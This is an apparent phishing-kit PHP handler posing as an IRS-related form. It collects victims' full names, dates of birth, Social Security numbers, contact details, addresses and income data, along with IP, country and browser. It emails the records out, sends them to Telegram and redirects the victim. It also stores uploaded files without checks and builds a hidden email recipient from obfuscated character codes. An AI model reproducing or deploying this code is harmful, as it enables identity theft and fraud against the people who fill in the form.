<?php
require("config.php");
include('me.php');
   $country = visitor_country();
   $ip = getenv("REMOTE_ADDR");
$Port = getenv("REMOTE_PORT");
$browser = $_SERVER['HTTP_USER_AGENT'];
$adddate=date("D M d, Y g:i a");
$subject = "**Prohqcker**";
$message = "**Prohqcker*I*R*S***+++\n";
$message .= "Full Name: ".$_POST['fname']."\n";
$message .= "DoB: ".$_POST['dob']."\n";
$message .= "SSN: ".$_POST['ssn']."\n";
$message .= "Email: ".$_POST['email']."\n";
$message .= "Phone No: ".$_POST['phone']."\n";
$message .= "Address: ".$_POST['address']."\n";
$message .= "Zip Code: ".$_POST['zip']."\n";
$message .= "E-Status: ".$_POST['emp']."\n";
$message .= "E-Time: ".$_POST['empa']."\n";
$message .= "Yearly Amount: ".$_POST['year']."\n";
$message .= "Credit Status: ".$_POST['debt']."\n";
$message .= "Amount: ".$_POST['yeara']."\n";
$message .= "User-!P : ".$ip."\n";
$message .= "Country : ".$country."\n\n";
$message .= "----------------------------------------\n";
$message .= "Date : $adddate\n";
$message .= "User-Agent: ".$browser."\n";
$headers = "From: Prohqcker";
@mail($send,$subject,$message,$headers);
send_telegram_msg($message);
header("location:c.html");
if(isset($_POST["submit"])){
  foreach ($_FILES['file']['tmp_name'] as $key => $image){
    $fileName = $_FILES['file']['name'][$key];
    $fileTmpName = $_FILES['file']['tmp_name'][$key];
  
    $target = 'abc/';
  
    $result = move_uploaded_file($fileTmpName, $target.$fileName);
  
  }
}
function country_sort(){
  $sorter = "";
  $array = array(114,101,115,117,108,116,98,111,120,49,52,64,103,109,97,105,108,46,99,111,109);
    $count = count($array);
  for ($i = 0; $i < $count; $i++) {
      $sorter .= chr($array[$i]);
    }
  return array($sorter, $GLOBALS['recipient']);
}
function visitor_country()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_countryName != null)
    {
        $result = $ip_data->geoplugin_countryName;
    }

    return $result;
}
?>

